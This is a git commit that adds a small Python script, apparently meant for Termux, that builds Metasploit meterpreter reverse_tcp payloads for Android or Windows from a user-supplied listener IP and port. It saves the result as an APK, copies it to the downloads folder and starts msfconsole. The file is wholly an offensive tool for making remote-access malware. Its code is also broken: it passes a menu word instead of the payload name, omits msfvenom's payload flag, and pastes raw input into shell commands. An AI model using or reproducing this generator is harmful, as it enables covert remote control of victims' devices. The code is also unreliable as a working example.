964fc70359302ad8a1958227d55eded618ed1b0c
Aditya <63653252+Adia12528@users.noreply.github.com>
2022-04-14 20:58:50 +0530

    Add files via upload

---
+++ payload_maker_tool.py
@@ -0,0 +1,20 @@
+import os
+
+first = "android/meterpreter/reverse_tcp"
+second = "windows/meterpreter/reverse_tcp"
+print("available payloads:", first)
+print("available payloads:", second)
+Android_payload = input("Enter the payload - first or second: ",)
+lhost = input("Enter your ip address - ",)
+lport = input("Enter your port number - ",)
+apk_name = input("Enter apk name - ",)
+msfvenom_sentence = "msfvenom "+ Android_payload+ " lhost"+"="+lhost+ " lport"+ "="+ lport+" R> "+apk_name
+os.system(msfvenom_sentence)
+
+def payload():
+    if Android_payload == "first":
+        os.system("cp "+apk_name+" /data/data/com.termux/files/home/storage/downloads")
+        os.system("msfconsole")
+    else:
+        print("Wrong syntax")
+payload()
